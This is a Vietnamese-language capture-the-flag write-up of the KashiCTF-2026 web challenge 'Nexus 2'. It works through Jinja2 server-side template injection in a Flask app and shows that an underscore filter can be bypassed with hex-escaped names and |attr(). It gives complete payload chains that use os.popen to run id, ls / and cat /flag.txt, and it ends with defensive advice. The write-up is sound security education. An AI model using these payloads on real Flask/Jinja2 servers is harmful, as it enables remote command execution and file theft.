---
layout: single
title: "[KashiCTF-2026] Nexus 2 - SSTI Jinja2, bypass filter bằng hex encoding"
date: 2026-04-07
classes: wide
categories: [CTF, KashiCTF-2026, web]
tags: [web, ssti, python, flask, kashictf, rce, jinja2]
header:
  teaser: /assets/images/tournaments/kashictf.png
---

## Challenge Info

**Event:** KashiCTF-2026  
**Category:** Web  
**Points:** 500  
**Solves:** 3 (Hard)  
**Author:** Aerex

> "The lights from the future have become stronger, you have to be careful boy!!!"

---

## Recon

Wappalyzer cho thấy stack: **Flask 3.0.6 / Python 3.11.15**, phía trước có Node.js + Express làm reverse proxy.

![Challenge info](/assets/images/nexus2-writeup/image0.jpeg)

Flask dùng **Jinja2** làm template engine mặc định — đây là mục tiêu rõ ràng để thử SSTI.

![Wappalyzer](/assets/images/nexus2-writeup/image1.jpeg)

Confirm SSTI bằng hai payload định danh:

- `{% raw %}{{7*7}}{% endraw %}` → trả về `49` ✓
- `{% raw %}{{7*'7'}}{% endraw %}` → trả về `7777777` ✓

Kết quả `7777777` là đặc trưng của Jinja2/Python (int * str = repeat). Nếu là Twig (PHP) thì sẽ out `49`. Xác nhận đây là **Jinja2 SSTI**.

---

## Phân tích filter

Khi thử các payload khai thác thông thường:

```
Nice try, but that input is not allowed!
```

Filter đang chặn gì đó. Bắt đầu test từng thành phần.

**Test `{% raw %}{{lipsum}}{% endraw %}`** → PASS, trả về object bình thường.

![lipsum pass](/assets/images/nexus2-writeup/image2.jpeg)

**Test `{% raw %}{{lipsum.__globals__}}{% endraw %}`** → BLOCKED ngay lập tức.

Kết luận: filter đang chặn ký tự dấu gạch dưới `_`. Vấn đề là tất cả magic attribute của Python đều có dạng `__xxx__`, nên không thể dùng trực tiếp.

---

## Bypass: hex encoding + `|attr()`

Jinja2 hỗ trợ hex escape trong string literals. Ký tự `_` = `\x5f`. Thay vì viết `.__globals__`, ta dùng `|attr('\x5f\x5fglobals\x5f\x5f')`.

**Bước 1: Đọc globals**

```python
{% raw %}{{lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')}}{% endraw %}
```

`\x67\x6c\x6f\x62\x61\x6c\x73` = `globals`

PASS — dump được toàn bộ global namespace.

![Globals dump](/assets/images/nexus2-writeup/image3.jpeg)

**Bước 2: Lấy module `os`**

```python
{% raw %}{{lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x6f\x73')}}{% endraw %}
```

`\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f` = `__getitem__`  
`\x6f\x73` = `os`

PASS — có thể truy cập `os` module.

![OS module](/assets/images/nexus2-writeup/image4.jpeg)

---

## RCE

Gọi `os.popen().read()` với toàn bộ tên attribute encode hex:

```python
{% raw %}{{lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x69\x64')|attr('\x72\x65\x61\x64')()}}{% endraw %}
```

`\x70\x6f\x70\x65\x6e` = `popen`  
`\x69\x64` = `id` (lệnh Linux)  
`\x72\x65\x61\x64` = `read`

Kết quả: `uid=0(root) gid=0(root) groups=0(root)` — server đang chạy với quyền root.

![RCE id](/assets/images/nexus2-writeup/image5.jpeg)

**Liệt kê `/`:**

```python
{% raw %}{{lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x6c\x73\x20\x2f')|attr('\x72\x65\x61\x64')()}}{% endraw %}
```

`\x6c\x73\x20\x2f` = `ls /` → thấy `flag.txt` ở root.

![ls /](/assets/images/nexus2-writeup/image6.jpeg)

**Đọc flag:**

```python
{% raw %}{{lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('\x72\x65\x61\x64')()}}{% endraw %}
```

![Flag](/assets/images/nexus2-writeup/image7.jpeg)

**Flag:** `kashiCTF{lo4zrfGNOi1HbEVSaF1gidjJyKczKtbr}`

---

## Tóm lại

Filter chặn ký tự `_` là một biện pháp phổ biến để ngăn SSTI trên Jinja2, nhưng nó không đủ nếu không kèm theo whitelist input nghiêm ngặt. Hex encoding + `|attr()` là một kỹ thuật bypass khá kinh điển cho loại filter này.

Một số điểm đáng chú ý:
- `lipsum` là Jinja2 global hiếm khi bị filter hơn `config` hay `request`
- `|attr()` thay thế dot notation, cho phép truy cập attribute qua string bất kỳ
- Blacklist filter kiểu này về cơ bản không thể cover hết — nên dùng Jinja2 `SandboxedEnvironment` hoặc tránh render input người dùng trực tiếp vào template
